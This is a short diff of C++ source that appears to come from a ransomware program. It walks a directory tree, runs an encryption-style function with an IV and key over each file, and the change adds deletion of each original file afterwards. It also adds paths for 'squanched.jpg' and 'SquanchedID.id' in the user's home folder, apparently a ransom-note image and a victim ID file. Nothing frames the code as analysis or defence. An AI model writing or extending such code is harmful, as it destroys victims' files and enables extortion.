@@ -78,6 +78,7 @@ void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
 		}
 		else {
 			process(path,iv,key);
+			remove(path);
 		}
 	}
 }
@@ -130,6 +131,14 @@ size_t getFileSize(const string path)
 	return plaintextLen;
 }
 
+string get_path_to_jpeg()
+{
+	return get_home() + R"(\squanched.jpg)";
+}
+
+string get_path_to_id() {
+	return get_home() + R"(\SquanchedID.id)";
+}
 string get_home() {
 #ifdef _WIN32
 	string path;
@@ -151,4 +160,6 @@ string get_home() {
 	if (pw) {
 		return string(pw->pw_dir);
 #endif
-	}
+}
+
+
